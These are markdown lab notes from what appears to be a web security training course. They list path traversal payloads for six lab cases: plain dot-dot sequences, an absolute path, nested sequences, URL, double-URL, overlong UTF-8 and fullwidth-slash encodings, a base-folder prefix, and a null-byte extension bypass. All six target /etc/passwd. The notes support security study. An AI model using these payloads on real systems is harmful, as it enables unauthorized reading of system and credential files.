## Lab all - Path Traversal Techniques
**End Goal** - Understand all the different techniques to perform a path traversal.

---
### Analysis: 

- **Lab 1 -Simple case**  
    - Simple path traversal to   
    - ?filename=`../../../etc/passwd`  

---
      
- **Lab 2 - Traversal sequences blocked with absolute path bypass**  
    - Use an absolute path from the filesystem root
    - ?filename=`/etc/passwd`  

---
      
- **Lab 3 - Traversal sequences stripped non-recursively**  
    - Use nested traversal sequences
    - ?filename=`....//etc/passwd`  
    - ?filename=`....\/etc/passwd`  

---

- **Lab 4 - Traversal sequences stripped with superfluous URL-decode**  
    - Use URL encoding, or even double URL encoding
    - ?filename=`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`  
    - ?filename=`%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd`  
    - **Using Overlong UTF-8 Encoding**  
    ?filename=`..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`  
    - **Using Fullwidth Solidus Unicode**  
    ?filename=`..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd`  

---
      
- **Lab 5 - Validation of start of path**  
    - Application may require the user-supplied filename to start with the expected base folder, such as:
    - ?filename=`/var/www/images/../../../etc/passwd`  

---

- **Lab 6 - Validation of file extension with null byte bypass**  
    - An application may require the user-supplied filename to end with an expected file extension, such as `.png`  
    - ?filename=`../../../etc/passwd%00.png`